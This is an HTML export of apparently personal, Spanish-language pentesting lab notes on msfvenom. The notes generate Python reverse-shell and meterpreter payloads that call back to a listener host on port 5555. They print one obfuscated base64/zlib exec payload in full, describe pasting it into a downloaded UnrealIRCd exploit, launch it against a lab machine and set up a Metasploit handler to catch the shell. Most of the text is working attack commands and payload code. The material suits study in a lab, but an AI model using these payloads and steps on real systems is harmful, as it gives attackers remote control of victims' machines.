<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MsfVenom</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MsfVenom</h1><br/><p></p><p></p><p></p><p><div class="codebox"><pre><br />msfvenom -h</pre></div></p><p></p><p><img src="images/114-1.png" alt="images/114-1.png" /></p><p></p><p>Se trata de un generador de payloads.</p><p></p><p>Vamos a generar un payload para la vulnerabilidad de UnrealIRC de la máquina ubuntu.</p><p></p><p><div class="codebox"><pre><br />msfvenom -p python<span style="color:#000000;font-weight:700">/</span>shell_reverse_tcp lhost=192.168.20.131 lport=5555</pre></div></p><p></p><p><img src="images/114-2.png" alt="images/114-2.png" /></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">exec</span>(<span style="color:#729fcf;font-weight:400">__import__</span>(<span style="color:#edd400;font-weight:400">&#39;zlib&#39;</span>).decompress(<span style="color:#729fcf;font-weight:400">__import__</span>(<span style="color:#edd400;font-weight:400">&#39;base64&#39;</span>).b64decode(<span style="color:#729fcf;font-weight:400">__import__</span>(<span style="color:#edd400;font-weight:400">&#39;codecs&#39;</span>).getencoder(<span style="color:#edd400;font-weight:400">&#39;utf-8&#39;</span>)(<span style="color:#edd400;font-weight:400">&#39;eNpNjstuwyAQRdfwFd4ZVBcZ96G0EouocqWoahsl3kcOTBQUFxCD298vNF50dmfumYf9Cj6mCr2+QKpGrJDapTUfQ/QaEEs7UvQKxdVjKNavh81HPzQo9p8vb4f9sOvX7zxLQnvnQCfGavnUCfm4El0r5J2sm4dcnNOfs52gGuIMz5QYlUci6G8m2+6eU2JP1QSOGa5Um3NyjDBeKAkqiq0PJREGtDfA6jmdblc1b/AM06TKwgaTsa6om21fwM/pH0GMC+VDXgVxNfL90TB+88fZWZiS/BqCM8xz+gsYJFx8&#39;</span>)[<span style="color:#edd400;font-weight:400">0</span>])))</pre></div></p><p></p><p>Copiamos el payload y vamos a modificar aquel que descargamos de github.</p><p></p><p>Comentamos el anterior o lo eliminamos y pegamos el nuevo:</p><p><img src="images/114-3.png" alt="images/114-3.png" /></p><p></p><p>Importante modificar las comillas y añadir una contra-barra para que no las trate como comillas.</p><p></p><p><img src="images/114-4.png" alt="images/114-4.png" /></p><p></p><p>Lanzamos el exploit</p><p></p><p><div class="codebox"><pre><br />./exploit.py 192.168.20.128 -payload python</pre></div></p><p></p><p></p><p>Por supuesto se pueden crear muchos más payloads:</p><p></p><p><div class="codebox"><pre><br />msfvenom -p python/meterpreter_reverse_tcp lhost=192.168.20.131 lport=<span style="color:#edd400;font-weight:400">5555</span></pre></div></p><p></p><p>En ese caso directamente inyecta en el propio payload el meterpreter lo que supone un código demasiado grande y aquí es cuando vemos el uso real de los stagers y stages.</p><p></p><p><div class="codebox"><pre><br />msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.20.131 lport=<span style="color:#edd400;font-weight:400">5555</span></pre></div></p><p></p><p>Ese cambio hace que el payload generado cree el reverse shell por TCP y una vez hecho desde los stages inyecta el meterpreter.</p><p></p><p>Para poder recibir esta conexión debemos establecer un listener handler en metasploit.</p><p></p><p><img src="images/114-5.png" alt="images/114-5.png" /></p><p></p><p><img src="images/114-6.png" alt="images/114-6.png" /></p><p></p><p>Seleccionamos el payload que hemos creado antes:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">set</span> payload python<span style="color:#000000;font-weight:700">/</span>meterpreter<span style="color:#000000;font-weight:700">/</span>reverse_tcp</pre></div></p><p></p><p><img src="images/114-7.png" alt="images/114-7.png" /></p><p></p><p><img src="images/114-8.png" alt="images/114-8.png" /></p><p></p><p>Lanzamos el exploit.</p><p></p><p></p><p></p></div>
</body>
</html>
